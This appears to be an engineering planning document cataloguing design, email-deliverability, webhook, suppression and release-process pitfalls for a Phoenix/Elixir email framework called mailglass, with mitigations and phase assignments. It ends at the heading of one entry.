# Pitfalls Research

**Domain:** Phoenix-native transactional email framework (Swoosh-based, multi-package OSS suite)
**Researched:** 2026-04-21
**Confidence:** HIGH (grounded in 4 prior shipped Elixir/Phoenix OSS libs + explicit prompts/ research; minor field-knowledge supplements clearly tagged)

---

## How to Read This Document

Each pitfall is one of:
- **Library API design** (LIB-NN) — how the public surface goes wrong
- **Email-domain** (MAIL-NN) — what email infrastructure breaks
- **OSS distribution** (DIST-NN) — multi-package and release hygiene failures
- **Phoenix/Ecto integration** (PHX-NN) — host-app coupling mistakes
- **Telemetry/observability** (OBS-NN) — instrumentation pitfalls
- **Testing** (TEST-NN) — testing strategy failures
- **CI/CD** (CI-NN) — pipeline and supply-chain mistakes
- **Maintenance/scope** (MAINT-NN) — long-term sustainability traps

Phase mapping uses the v0.1 → v0.5 → v0.5+ inbound trajectory locked in `PROJECT.md`.

---

## Critical Pitfalls

### LIB-01: Macro Abuse via `use Mailglass.Mailable`

**What goes wrong:**
A `use Mailglass.Mailable` injects hundreds of lines into every adopter mailer module — implicit imports, hidden callbacks, `defoverridable` lists, mystery `__before_compile__` hooks. Compile times balloon, stack traces become unreadable, "go to definition" lands in macro-generated phantom code, and adopters cannot tell what their own module actually contains.

**Why it happens:**
"Look how little boilerplate the user writes!" is seductive. Authors port Rails ActionMailer's `class < ActionMailer::Base` mental model directly, forgetting that Elixir favors explicit composition over inheritance. Compile-time deps explode silently because every macro reference creates a hard recompile edge.

**How to avoid:**
- `Mailglass.Mailable` is a **narrow `@behaviour`**, not a `use` block — callbacks: `envelope/1`, `content/1`, optional `attachments/1`, optional `preview_props/1`.
- If a `use` shim exists for ergonomics, it MUST inject ≤20 lines (a `@behaviour` declaration, an optional `@before_compile` for compile-time NimbleOptions validation, nothing more) AND ship a `@moduledoc` "nutrition facts" admonition listing every effect.
- Add a **custom Credo check** `Mailglass.Credo.NoOversizedUseInjection` that flags any `__using__/1` whose AST exceeds N lines.
- Run `mix xref trace Mailglass.Mailable` in a CI smoke test to assert the compile-dep fan-out stays bounded.

**Warning signs:**
- `mix compile --force` on a host app takes >10s longer after `use Mailglass.Mailable` is added to one module.
- Adopter issues like "where does `subject/1` come from?" or "I can't override X".
- `mix xref graph --label compile` shows mailers as compile-edges to every other lib module.

**Phase to address:**
**Phase 0 — Foundation / API design lock**, with custom Credo check landing in **v0.1 — Core (lint lane)**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:687-689` (gotcha §6 item 1 — "don't expose `use MyLib` if `import` or normal calls are enough"); `prompts/elixir-opensource-libs-best-practices-deep-research.md:228-256` (`use`/macro anti-patterns); `prompts/Phoenix needs an email framework not another mailer.md:262-302` (the public DX target deliberately keeps `use` thin).

---

### LIB-02: Compile-Time Dependency Explosion

**What goes wrong:**
A change to `Mailglass.Email` (struct field added) triggers recompilation of every adopter mailable, every webhook handler, every test file. CI on adopter projects goes from 30s to 4 minutes. Over time, maintainers stop running `mix test` locally because the recompile loop is unbearable.

**Why it happens:**
Macros that pattern-match on host-app modules at compile time create implicit compile edges. `Application.compile_env!/2` reads bake configuration into `.beam` files, requiring rebuild on config change. Importing internal modules into `__using__` blocks fans recompile hazards out across the host app.

**How to avoid:**
- **Forbid `Application.compile_env/2` and `Application.compile_env!/2` everywhere except a single `Mailglass.Config` module that is itself recompile-safe.** All other modules read via `Application.get_env/2` + `Mailglass.Config.resolve!/1` (NimbleOptions-validated at boot).
- Wrap any macro-time resolution in `Macro.expand_literals/2` so literal expansion doesn't introduce module deps (per official anti-pattern docs).
- CI gate: `mix xref graph --format stats --label compile-direct` — fail if any single module has >5 inbound compile edges from outside its subtree.
- Custom Credo check `Mailglass.Credo.NoCompileEnvOutsideConfig`.

**Warning signs:**
- A 1-line schema field addition triggers `_build/dev` recompilation of >50 files.
- Dialyzer warns about "unknown module" on optional deps after a config change.
- `mix xref trace MyApp.SomeMailer` shows compile edges to provider-specific modules.

**Phase to address:**
**Phase 0 — Foundation / Config module design**, enforced by Credo check in **v0.1 lint lane**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:691-694` (gotcha §6 item 1 — "Don't ship `Application.compile_env!` for runtime settings"); `prompts/elixir-opensource-libs-best-practices-deep-research.md:248-252` (Macro.expand_literals/mix xref trace).

---

### LIB-03: Options That Change Return Types

**What goes wrong:**
`Mailglass.deliver/2` returns `{:ok, %Send{}}` when called normally, `{:ok, html, text}` when `format: :preview` is set, `:ok` (no tuple) when `async: true` is set. Pattern matching at every call site requires reading docs every time. Adopters write defensive `case` blocks with three branches.

**Why it happens:**
"Why have three functions when one with options does it all?" Authors optimize for typing-effort over caller-clarity. Bang variants get added later instead of designed in.

**How to avoid:**
- Lock the public API to the shape locked in `PROJECT.md`: `deliver/2 → {:ok, %Send{}} | {:error, %Mailglass.Error{}}`, `deliver_later/2 → {:ok, %Oban.Job{}} | ...`, `deliver_many/2 → {:ok, [%Send{}]} | ...`. **Bang variants raise the same struct.**
- Different return shape ⇒ different function name. `preview/2`, `dispatch/2`, `deliver/2` all distinct.
- NimbleOptions schema attached to every public function via `@doc options: NimbleOptions.docs(@schema)` — auto-rendered in HexDocs, validated at runtime.
- Doctest every (function, return-shape) pair to lock the contract.

**Warning signs:**
- A single function's `@doc` lists more than one return shape.
- Adopter code patterns: `case Mailglass.deliver(...) do {:ok, _} -> ...; {:ok, _, _} -> ...; :ok -> ... end`.
- ExDoc `@spec` for one function spans more than 3 lines.

**Phase to address:**
**Phase 0 — Foundation / API stability lock** (drafts `api_stability.md`).

**Citation:** `prompts/elixir-opensource-libs-best-practices-deep-research.md:46-71` ("Keep return types stable — alternative return types based on options is an explicit anti-pattern"); `prompts/mailglass-engineering-dna-from-prior-libs.md:96-104` (error-model discipline rule §1).

---

### LIB-04: Forced Exception-Driven Control Flow

**What goes wrong:**
`Mailglass.deliver/2` raises `Mailglass.SendError` on every provider 4xx response. Adopters wrap every send in `try/rescue`. Rescue blocks become rescue-and-discard, swallowing real bugs. Phoenix controllers crash on routine bounces because nobody remembered the rescue.

**Why it happens:**
Authors forget that "sending an email to a possibly-suppressed address" is a **routine** failure, not exceptional. Bang-only APIs feel cleaner to write. Provider HTTP clients raise by default, so the wrapping lib re-raises by default.

**How to avoid:**
- **Hard rule** (per `PROJECT.md` D-08 and the locked error model): public functions return `{:ok, _} | {:error, %Mailglass.Error{}}`. Bang variants exist only as one-line wrappers (`def deliver!(e, o), do: e |> deliver(o) |> bang!()`).
- **Exception:** `Mailglass.SignatureError` MUST raise at call site — there is no safe recovery from a forged webhook (see DIST-NN below). This is documented and intentional.
- `Mailglass.Error` carries `:type` from a closed atom set documented in `api_stability.md` (`:suppressed`, `:rate_limited`, `:invalid_recipient`, `:provider_error`, `:template_error`, `:config_error`). Pattern-match on `:type`, never on `:message`.
- Every guide example uses tuple form. The "raise" path is in a single "When to use bang variants" section.

**Warning signs:**
- README example shows `try` blocks.
- Internal mailglass code does `try`/`rescue` on its own functions to recover (sign of bad ergonomics — fix the source, don't catch).
- `:type` field appears in stack traces (means callers are inspecting `Exception.message/1`).

**Phase to address:**
**Phase 0 — Error model lock** (`api_stability.md`).

**Citation:** `prompts/elixir-opensource-libs-best-practices-deep-research.md:71-77` ("Do not force exception-driven control flow"); `prompts/mailglass-engineering-dna-from-prior-libs.md:79-104` (error-model discipline rules); `PROJECT.md:41` (Mailglass.Error struct hierarchy).

---

### LIB-05: Hidden Singleton (`Mailglass` registered as a global)

**What goes wrong:**
The lib internally registers a `GenServer` under the name `Mailglass`, holds the active adapter config, and rejects any second instance. Multi-tenant apps that need a separate adapter per tenant cannot run two — the second `start_link` returns `{:error, {:already_started, _}}`. The architecture forces a `tenant_id` argument on every send to "look up the right config", but the singleton process is now a serialization bottleneck.

**Why it happens:**
"There's only one mailer per app, right?" — wrong. Inherits from Rails ActionMailer's class-level state. Authors haven't internalized that mailglass v0.1 promises **first-class multi-tenancy** (D-09).

**How to avoid:**
- **No singletons.** `Mailglass.Adapter.SwooshBridge`, `Mailglass.Suppression.Store`, `Mailglass.Auth` adapters are all stateless modules. State lives in adopter-controlled processes (Repo, Oban, named adapters).
- Per-tenant adapter resolution happens in `Mailglass.Tenancy.scope/2` + a config function (`config :mailglass, resolver: {MyApp.TenantRouter, :resolve, []}`).
- If a registered process is unavoidable (e.g., rate-limit token bucket per domain), require a `:name` option and document multi-instance setup. Default `name: __MODULE__` is **forbidden** for any public-facing process.
- Custom Credo check `Mailglass.Credo.NoDefaultModuleNameSingleton`.

**Warning signs:**
- Anywhere in `lib/mailglass/` you see `GenServer.start_link(..., name: __MODULE__)` without a `:name` option override path.
- Adopter issue: "How do I run two mailglass instances?"
- The word "singleton" appears in any moduledoc.

**Phase to address:**
**Phase 0 — Foundation / Application supervision tree design**.

**Citation:** `prompts/elixir-opensource-libs-best-practices-deep-research.md:191-203` ("Be careful with default names — avoid hidden globals"); `prompts/mailglass-engineering-dna-from-prior-libs.md:269-273` (per-tenant adapter resolver); `PROJECT.md:159` (D-09 multi-tenancy first-class).

---

### LIB-06: GenServer Scattering Instead of Pure Functions

**What goes wrong:**
`Mailglass.Outbound.send/2` is a `GenServer.call(__MODULE__, {:send, email})`. Every send blocks on a single mailbox. Telemetry handlers inside the GenServer leak state across calls. When the GenServer crashes, Oban jobs accumulate. A bug in template rendering brings down all outbound for 30 seconds before the supervisor restarts.

**Why it happens:**
Reflexive "I need state, so I need a GenServer." Authors don't separate "needs runtime concurrency" from "needs request scoping."

**How to avoid:**
- The render pipeline (HEEx → CSS inline → minify → plaintext) is **pure functions**. Run in caller's process.
- The Swoosh bridge is **stateless**. Pass adapter config explicitly. Caller's process owns the HTTP request.
- The only legitimate GenServer in core: `Mailglass.RateLimiter` (token bucket per domain) — and even that is opt-in, named explicitly, and documented as multi-instance.
- **No `Agent`, no `:ets` table without an owner module that exposes a wrapper.** Centralize any GenServer interface — adopters never call `GenServer.call/3` directly on a mailglass process.

**Warning signs:**
- Throughput drops linearly with sender process count above ~50 (mailbox bottleneck).
- `:sys.get_state/1` appears in tests (hack to reach into a process).
- Any module exposes raw `GenServer.call/2` instead of a function wrapper.

**Phase to address:**
**Phase 0 — Application supervision tree**, **Phase 1 — Outbound core**.

**Citation:** `prompts/elixir-opensource-libs-best-practices-deep-research.md:130-167` ("Prefer modules and functions for organization; use processes only when runtime behavior demands it"); `prompts/mailglass-engineering-dna-from-prior-libs.md:106-115` (engineering DNA: pluggable behaviours over magic).

---

### LIB-07: `Application.compile_env!` for Runtime Settings

**What goes wrong:**
Adapter selection or webhook secret is read via `Application.compile_env!(:mailglass, :adapter)`. The value is baked into the compiled `.beam`. Releases need rebuild to change the adapter. Production rotation of webhook secrets requires deploying new code.

**Why it happens:**
`compile_env!` looks like a "stricter" version of `get_env`. Authors don't realize it freezes the value at compile time, which is fine for a local dev assertion but lethal for runtime config.

**How to avoid:**
- **Single source of truth**: `Mailglass.Config` reads via `Application.get_env(:mailglass, key, default)` + NimbleOptions validation at boot (in `Mailglass.Application.start/2`).
- `compile_env` allowed only for **build-time invariants** (e.g., "are we in `:prod` MIX_ENV?"). Documented in moduledoc with rationale.
- All provider secrets, adapter modules, tenant resolvers, webhook keys are runtime-resolved — typically via `runtime.exs` or a secrets fetcher tuple `{MyApp.Secrets, :fetch, [:postmark]}`.
- Custom Credo check `Mailglass.Credo.NoCompileEnvForRuntimeSettings` (whitelists `Mailglass.Config` only).

**Warning signs:**
- Releases rebuild on every secret rotation.
- Test config requires `Application.put_env/3` calls *before* `Mix.Task.run("compile")`.
- Adopter feedback: "I changed the adapter in `runtime.exs` and it didn't take effect."

**Phase to address:**
**Phase 0 — Config module design**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:691-694` (gotcha §6 item 1, accrue's pattern saved them from a class of release-build configuration bugs); `prompts/elixir-opensource-libs-best-practices-deep-research.md:80-114` (avoid global app env, prefer runtime over compile-time).

---

### MAIL-01: Open/Click Tracking on Auth-Carrying Messages (Legal Liability)

**What goes wrong:**
Magic-link login URLs are auto-rewritten through `https://track.example.com/click/<token>` because tracking was applied at the `Mailgable` level globally. A tracking-domain outage breaks every magic link in flight. A subpoena reveals mailglass logged the click timestamp + IP for every password reset — a **legal liability** under GDPR/ePrivacy and a security smell (open-redirect / SSRF if the rewrite isn't HTTPS-only with a signed token).

**Why it happens:**
Default-on tracking is the ESP industry default. Authors port that default. Apple Mail Privacy Protection (~50% of consumer mail) makes opens noisy anyway, so the value is low while the liability is high.

**How to avoid:**
- **Tracking off by default**, locked by `PROJECT.md` D-08. Per-mailable opt-in via `tracking: [opens: true, clicks: true]` in `envelope/1`.
- **Hard refusal**: `Mailglass.Outbound` raises `Mailglass.Compliance.AuthMessageTrackingError` at compile time (via custom Credo check `Mailglass.Credo.NoTrackingOnAuthStream`) when `tracking: [...]` is set on a mailable that declares `stream: :transactional` AND has a `magic_link` / `reset_token` / `verification_token` field in its struct.
- Click rewriting MUST: (a) HTTPS-only, (b) Phoenix.Token-signed opaque token (never raw URL), (c) on a dedicated subdomain (not the brand apex), (d) idempotent GET.
- Tracking pixel MUST be `<img src="https://...">` with a signed token, not a query-stringed identifier.

**Warning signs:**
- Password-reset emails contain a link to `track.example.com`.
- Telemetry shows `[:mailglass, :ops, :click, :received]` on a `password_reset` template.
- Adopter sets `Mailglass.Config.tracking_default(true)` in `runtime.exs`.

**Phase to address:**
**Phase 1 — Outbound core** (off-by-default lock); **Phase 2 — Mailable behaviour** (Credo check that pairs `stream` + `tracking`).

**Citation:** `PROJECT.md:160` (D-08 tracking off by default); `prompts/Phoenix needs an email framework not another mailer.md:160-164` (legal hot zone, Apple MPP, signed tokens, dedicated subdomain); `PROJECT.md:45` (open/click tracking off by default — never auto-applied to auth-carrying messages).

---

### MAIL-02: List-Unsubscribe Without RFC 8058 List-Unsubscribe-Post

**What goes wrong:**
The lib emits `List-Unsubscribe: <https://app.example.com/unsub/abc>` but omits `List-Unsubscribe-Post: List-Unsubscribe=One-Click`. Gmail and Yahoo's bulk-sender rules (Feb 2024 → Nov 2025 enforcement → permanent 550 rejection) classify the sender as non-compliant. Marketing/operational mail starts getting rejected. Reputation damage is **not reversible** — bulk-sender classification is permanent.

**Why it happens:**
RFC 2369 (the older `List-Unsubscribe`) is well-known; RFC 8058 (the one-click POST flavor) shipped in 2017 but only became mandatory in 2024. Older Phoenix libraries miss the upgrade.

**How to avoid:**
- `Mailglass.Compliance.add_unsubscribe_headers/1` emits **both** headers as a single atomic operation; impossible to add one without the other.
- Custom Credo check `Mailglass.Credo.RequiredListUnsubscribeHeaders` flags any direct `Swoosh.Email.header/3` setting `"List-Unsubscribe"` without going through `Mailglass.Compliance`.
- The unsubscribe controller generated by `mix mailglass.install` (a) accepts POST, (b) returns 200 without redirect, (c) is idempotent, (d) decodes a `Phoenix.Token`-signed opaque token (not raw email).
- Both headers MUST be in DKIM's `h=` tag (signed) — the `Mailglass.Compliance.dkim_sign/2` helper enforces this.
- Per `PROJECT.md`, message-stream separation means `:bulk` stream auto-injects unsubscribe headers; `:transactional` does not (correct per RFC 8058).

**Warning signs:**
- A test sends an `:operational` stream message and only `List-Unsubscribe` (no `-Post`) is in the headers.
- Postmaster Tools shows "headers compliance" warning.
- 550-class rejections from `gmail-smtp-in.l.google.com` mentioning "unsubscribe".

**Phase to address:**
**v0.5 — Deliverability + admin** (List-Unsubscribe + List-Unsubscribe-Post per `PROJECT.md:55`).

**Citation:** `prompts/Phoenix needs an email framework not another mailer.md:140-160` (Gmail/Yahoo bulk-sender rules + RFC 8058 specifics); `PROJECT.md:142` (constraints — RFC 8058 + 2024 bulk-sender rules); `prompts/mailglass-engineering-dna-from-prior-libs.md:181-187` (RequiredListUnsubscribeHeaders Credo check).

---

### MAIL-03: Webhook Idempotency Missing — Double-Counted Events

**What goes wrong:**
A provider retries a webhook delivery (network blip, 5s response timeout exceeded). The lib processes the same `complaint` event twice. The subscriber is suppressed twice (no-op), but a downstream analytics rollup double-counts the complaint, the event ledger has two rows for the same fact, and the admin UI shows "2 complaints" when the customer experienced one.

**Why it happens:**
Authors think "we wrote the suppression already, so the second call is a no-op" — true for the suppression, but the event ledger and the analytics projection corrupt silently.

**How to avoid:**
- **Lock from v0.1**: `mailglass_events` has a `UNIQUE` partial index on `idempotency_key WHERE idempotency_key IS NOT NULL` (per `PROJECT.md:39` and `prompts/mailglass-engineering-dna-from-prior-libs.md:326`).
- Every webhook event MUST set `idempotency_key = "#{provider}:#{provider_event_id}"` — provider name is part of the key to avoid collisions across providers (see MAIL-09).
- Insert via `Ecto.Multi`: data row + event row in one transaction. On `unique_violation` on the event, the transaction rolls back AND returns `{:ok, :replayed}` (not an error).
- Property test (StreamData): generate sequences of (event, replay-count) and assert convergence — applying the same event N times produces the same final state as applying it once.
- Webhook plug returns 200 OK on replays so the provider stops retrying.

**Warning signs:**
- Bounce counts in admin UI exceed Postmark/SendGrid dashboards.
- Postgres logs show `unique_violation` on `mailglass_events_idempotency_key_index` followed by a 500 response (means the rollback isn't being caught and translated to 200).
- An analytics rollup shows the same `provider_message_id` twice.

**Phase to address:**
**v0.1 — Core** (idempotency UNIQUE index); **v0.5 — Webhooks** (replay-safe handler dispatch).

**Citation:** `PROJECT.md:39` (idempotency keys via UNIQUE partial index); `prompts/mailglass-engineering-dna-from-prior-libs.md:303-331` (append-only ledger + idempotency); `prompts/Phoenix needs an email framework not another mailer.md:88-90` ("event ordering is not guaranteed across providers; batched webhooks require per-event error isolation").

---

### MAIL-04: SPF Lookup Count >10 (Silent Failure)

**What goes wrong:**
`mix mail.doctor` reports `SPF: PASS`. But the customer's SPF record includes `include:_spf.google.com include:sendgrid.net include:_spf.mailgun.org include:amazonses.com` — five `include:` directives, each of which recursively expands. Total DNS lookups exceed 10. Per RFC 7208 §4.6.4, the result is `permerror` — but no Elixir lib counts the lookups, so `mail.doctor` reports `pass` while real receivers reject. The customer cannot understand why mail still bounces.

**Why it happens:**
RFC 7208's 10-lookup limit is buried; most online "SPF check" tools report only the literal record. Authors treat SPF validation as "does the record syntactically parse?"

**How to avoid:**
- `Mailglass.Compliance.dns_doctor/1` (per `PROJECT.md:58`, the `mix mail.doctor` task) MUST recursively resolve every `include:`, `a:`, `mx:`, `exists:`, `redirect=`, and `ptr` mechanism, counting each as one lookup. Raise `permerror` warning at >10. Show the expanded tree in the admin UI.
- Use `:inet_res.lookup/3` with explicit DNS server pinning so the count is reproducible.
- Property test: synthesize SPF records with N includes, assert the doctor returns `permerror` at N=11.
- Document the limit and link to RFC 7208 §4.6.4 in the doctor's output.

**Warning signs:**
- `mail.doctor` reports `pass` but Postmaster Tools shows SPF failures.
- The customer's SPF record contains >3 `include:` directives.
- Soft bounces with `550 5.7.1 SPF check failed` in `mta_response`.

**Phase to address:**
**v0.5 — Compliance & deliverability / `mix mail.doctor`**.

**Citation:** RFC 7208 §4.6.4 (field knowledge — referenced in `prompts/Phoenix needs an email framework not another mailer.md:498` and `prompts/mailglass-engineering-dna-from-prior-libs.md:543`).

---

### MAIL-05: DKIM Key Rotation Without DNS Publishing Window

**What goes wrong:**
Operator rotates the DKIM private key in `runtime.exs` and deploys. The new selector's public key isn't in DNS yet (TTL hasn't expired, or DNS publish hasn't happened). Every outbound message for the next ~24h fails DKIM at the receiver. Inbox placement craters; reputation damage takes weeks to recover.

**Why it happens:**
Authors treat DKIM rotation as "swap the key in the config." DNS propagation + receiver caching + the dual-publish window (old + new selector both live for the TTL period) are non-obvious.

**How to avoid:**
- `Mailglass.Compliance.dkim_sign/2` requires a **selector**, not just a key. Operators rotate by adding a new selector (e.g., `mg2026a`), publishing it to DNS, waiting for TTL+buffer, then switching the active selector — never by replacing the key in place.
- `mix mail.doctor` checks **all** declared selectors, warns if the active one isn't published, and warns if non-active selectors that should still be live (within TTL+buffer) are missing.
- Generated rotation runbook in `guides/dkim-rotation.md`: ordered steps + DNS verification command + waiting period table by TTL.
- Default selector format includes a date stamp (`mg2026q2`) to make rotation history visible in DNS.

**Warning signs:**
- Customer reports inbox placement drop within 24h of a deploy.
- `Authentication-Results` headers on test mail show `dkim=none` (selector not in DNS).
- Operator config has only one selector ever.

**Phase to address:**
**v0.5 — Compliance & deliverability** (DKIM signing helper for self-hosted SMTP relay per `PROJECT.md:60`).

**Citation:** RFC 6376 §6.1.2 (field knowledge — referenced via `PROJECT.md:142` constraints and `prompts/Phoenix needs an email framework not another mailer.md:147` deliverability MUSTs).

---

### MAIL-06: Tracking Pixel Injection Without HTTPS + Signed Token

**What goes wrong:**
The pixel URL is `http://track.customer.example.com/p/<email>?msg=<id>`. HTTP, not HTTPS — receiving clients (Apple Mail, Gmail) downgrade-block the image; tracking is broken. The raw `email` in the path is a PII leak (server logs, referrers). The `msg=<id>` is sequential and guessable, allowing an attacker to enumerate sends. Worse: if the URL doesn't validate the host, an open-redirect or SSRF emerges (the tracking server fetches arbitrary URLs to "validate" the pixel).

**Why it happens:**
"It's just a 1×1 pixel" — minimum-viable thinking. Authors don't audit the URL shape.

**How to avoid:**
- `Mailglass.Tracking.pixel_url/2` produces ONLY: `https://<configured-tracking-host>/pixel/<phoenix-token-signed-opaque>`. No PII in the URL. No mutable parameters. Host MUST match the configured tracking subdomain (rejected at compile time if HTTP).
- The pixel handler MUST reject any path not parseable as a `Phoenix.Token` (with `max_age: 30 days`), returning a 1×1 transparent GIF + 404 (not 500).
- The pixel handler MUST NOT make outbound HTTP requests for any reason — it's a sink, not a source.
- Custom Credo check `Mailglass.Credo.NoPiiInTrackingUrls` flags any string-interpolation of `email` / `recipient` / `to` into a URL builder.

**Warning signs:**
- Tracking URLs contain `@` (raw email).
- Tracking URLs use `http://`.
- Tracking handler invokes `HTTPoison`/`Req`/`Finch` (means it's making outbound calls, classic SSRF surface).

**Phase to address:**
**v0.5 — Deliverability** (when tracking opt-in primitives are introduced).

**Citation:** `prompts/Phoenix needs an email framework not another mailer.md:160-164` (link rewriting must use signed tokens, dedicated subdomain, off by default on auth tokens); `PROJECT.md:143` (privacy constraints).

---

### MAIL-07: Suppression Scope Confusion (Per-Address vs Per-Domain vs Per-Tenant)

**What goes wrong:**
A complaint from `alice@bigcorp.com` causes mailglass to suppress `*@bigcorp.com` because the suppression's "scope" defaulted to `:domain`. Now no one at the customer's largest enterprise account receives email. The customer doesn't realize for 3 days. Recovery requires manual database surgery and a deliverability mea-culpa.

OR: a tenant boundary leak — suppression added in tenant A blocks sends in tenant B because the scope was `:address` global, not `:tenant_address`.

**Why it happens:**
"Suppression" is one English word but at least three database concepts. Authors pick one default and ship.

**How to avoid:**
- `Mailglass.Suppression` has an explicit `:scope` enum, **no default** — caller MUST specify: `:address` (this exact email), `:domain` (whole receiving domain — admin-only, never auto), `:tenant_address` (this email in this tenant), `:tenant_stream_address` (this email in this tenant for this stream).
- Auto-suppression on hard-bounce/complaint/unsubscribe defaults to `:tenant_address` (the safest scope). Domain-wide suppression requires admin LiveView confirmation + `Mailglass.Auth` step-up verification.
- The Credo check `Mailglass.Credo.NoUnscopedTenantQueryInLib` (per engineering DNA) catches any Repo query on suppression that doesn't go through `Mailglass.Tenancy.scope/2`.
- Admin UI shows the scope explicitly on every suppression row — never just the email.

**Warning signs:**
- A single complaint event creates a `*@*` row.
- The suppression schema lacks a `scope` column.
- Adopter issue: "Suppression in staging is blocking my prod sends" (means scope is missing tenant).

**Phase to address:**
**v0.5 — Deliverability + suppression management** (`Mailglass.Suppressions` per `PROJECT.md:56`).

**Citation:** `prompts/mailer-domain-language-deep-research.md:531-554` (SuppressionScope is a first-class concept; SuppressionReason has a closed canonical set); `PROJECT.md:159` (D-09 multi-tenancy first-class).

---

### MAIL-08: Bounces Classified Wrong (Soft vs Hard, Permanent vs Transient)

**What goes wrong:**
A `421 4.7.0 Greylisted` (transient, retry in 5min) is classified as a hard bounce; the recipient is suppressed forever. Conversely, a `550 5.1.1 User unknown` is classified as soft; the lib retries 4 more times, accumulating reputation damage at the receiver.

**Why it happens:**
Provider webhooks normalize bounce codes inconsistently (Postmark uses its own enum, SendGrid surfaces SMTP codes, Mailgun uses MTA classes, SES surfaces both). Authors map them to a single boolean `hard_bounce?` and lose information.

**How to avoid:**
- Adopt the **Anymail taxonomy verbatim** (per `PROJECT.md:43` D-14): event types include `:bounced` and `:deferred` as distinct classes; `reject_reason ∈ :invalid | :bounced | :timed_out | :blocked | :spam | :unsubscribed | :other | nil`.
- Per-provider mappers translate raw codes to this taxonomy; the mapper modules are the **only** place provider-specific knowledge lives. One mapper per provider, exhaustive case match (no `_ -> :unknown` catch-all without a `Logger.warning`).
- Soft-bounce escalation policy is **explicit and configurable** (`PROJECT.md:56`: 5 in 7 days → hard suppress); never silently turn a soft bounce into a hard suppression on first occurrence.
- Property test (StreamData): for each provider's bounce-code corpus (recorded fixtures from real webhooks), assert the mapper produces a deterministic `(event_type, reject_reason)` pair.
- Preserve `mta_response` and `provider_payload` on every event (per the canonical struct in `prompts/mailer-domain-language-deep-research.md:170-187`).

**Warning signs:**
- A new provider's mapper has a `_ -> :hard_bounce` clause.
- Suppression list contains addresses that were "soft-bounced once."
- Bounce categorization disagrees with provider's own dashboard.

**Phase to address:**
**v0.5 — Webhooks** (Postmark + SendGrid v0.1, expand in v0.5 per D-10).

**Citation:** `prompts/mailer-domain-language-deep-research.md:619-672` (canonical event language + reject_reason set); `PROJECT.md:43` (D-14 Anymail taxonomy verbatim); `prompts/Phoenix needs an email framework not another mailer.md:189-206` (canonical webhook event taxonomy).

---

### MAIL-09: Provider `message_id` Collision Across Providers

**What goes wrong:**
Postmark and SendGrid both emit message IDs like `<abc-123@some-server.com>`. The mailglass `mailglass_sends` table has `UNIQUE(provider_message_id)` (no provider name in the index). A migration of a customer from Postmark to SendGrid produces a primary-key violation when SendGrid emits an ID Postmark already used. The send fails silently in CI and produces a 500 in prod.

**Why it happens:**
"Message IDs are globally unique, right?" — wrong. They're unique within the issuing provider, not across providers.

**How to avoid:**
- `mailglass_sends` UNIQUE constraint MUST be `(provider, provider_message_id)`, never just `provider_message_id`. Same for `mailglass_events` idempotency key (already includes `provider:` prefix per MAIL-03).
- Migration test asserts the unique index includes both columns.
- Document in the multi-provider guide: "If you switch providers, send IDs do not collide because the provider name is part of the key."

**Warning signs:**
- Migration that adds `provider_message_id` UNIQUE without `provider`.
- A customer running mailglass with multiple providers reports `unique_violation` on send.

**Phase to address:**
**v0.1 — Core** (schema design for `mailglass_sends` + `mailglass_events`).

**Citation:** Field knowledge informed by `prompts/mailer-domain-language-deep-research.md:357-360` (ProviderRef — never leak provider IDs into core naming, store as provider refs) and the per-tenant adapter resolver design (`PROJECT.md:59`).

---

### DIST-01: Sibling Version Drift (`mailglass v0.3 + mailglass_admin v0.1` Incompatible)

**What goes wrong:**
A user installs `{:mailglass, "~> 0.3"}` and `{:mailglass_admin, "~> 0.1"}`. Mailglass v0.3 renamed `Mailglass.Outbound.Send` to `Mailglass.Send`. Mailglass_admin v0.1 references the old name. Their app boots, then crashes on the first admin LiveView render. The user doesn't know which package to pin.

**Why it happens:**
Sibling packages need linked-version releases, but it's easy to forget on a fix-only release. Pre-1.0 churn is high. Adopter dependency resolution doesn't enforce sibling alignment.

**How to avoid:**
- **Release Please with linked-versions plugin + `separate-pull-requests: false`** (per `PROJECT.md:48` and `prompts/mailglass-engineering-dna-from-prior-libs.md:113`). Every release is a coordinated bump of all sibling packages, even if only one changed.
- Both packages declare the dependency tightly: `mailglass_admin` mix.exs has `{:mailglass, "== 0.3.4"}` (pinned to exact version, not `~>`) — verified by CI.
- A `verify.sibling_compat` mix task in CI builds the latest `mailglass_admin` against the latest `mailglass` and asserts they compile + a smoke test passes.
- `MAINTAINING.md` runbook explicitly walks the linked-version release process.

**Warning signs:**
- A patch release of `mailglass` doesn't trigger a corresponding `mailglass_admin` bump.
- `mailglass_admin/mix.exs` uses `~>` for the mailglass dependency.
- A user issue: "mailglass_admin won't compile against the latest mailglass."

**Phase to address:**
**v0.1 — CI/CD setup** (release-please-config.json with linked versions); **v0.1 — sibling package shape locked**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:71-74` (release-please-config separate-pull-requests:false + linked-versions plugin); `PROJECT.md:48,153` (D-01 sibling packages, D-16 linked-version automation); `prompts/elixir-oss-lib-ci-cd-best-practices-deep-research.md:212-221` (Release Please best fit).

---

### DIST-02: Compiled Assets (`priv/static/`) Drift Between Dev and CI

**What goes wrong:**
A developer rebuilds `mailglass_admin`'s assets locally with esbuild, commits the changes. Then makes a CSS tweak but forgets to run the rebuild. CI doesn't catch it (nobody re-runs esbuild in CI). The Hex package ships with stale assets. Adopters see broken admin UI on the published version even though dev works fine.

**Why it happens:**
The build pipeline is asymmetric: dev developers have esbuild watching live; CI only runs `mix test`. Asset rebuilding feels like a step that "always happens" — until it doesn't.

**How to avoid:**
- **`git diff --exit-code` on `priv/static/` in CI** after running the asset build (per `prompts/mailglass-engineering-dna-from-prior-libs.md:701` — accrue's admin-drift-docs lane).
- Explicit `mix mailglass_admin.assets.build` task that's identical between dev and CI.
- Pre-commit hook (optional, documented) runs the asset build.
- Hex package whitelists `priv/static/` explicitly so the publish artifact is checked.

**Warning signs:**
- `priv/static/app.css` has uncommitted diff after `mix mailglass_admin.assets.build`.
- Adopters report "Admin UI looks wrong" but dev looks fine.
- The CI lane that builds assets isn't tied to the test-result lane.

**Phase to address:**
**v0.1 — CI/CD** (admin-drift-docs lane); **v0.5 — admin LiveView shipped**.

**Citation:** `prompts/mailglass-engineering-dna-from-prior-libs.md:697-701` (gotcha §6 item 6 — accrue's admin-drift-docs lane).

---

### DIST-03: `mix mailglass.install` Non-Idempotent — Clobbers Customizations

**What goes wrong:**
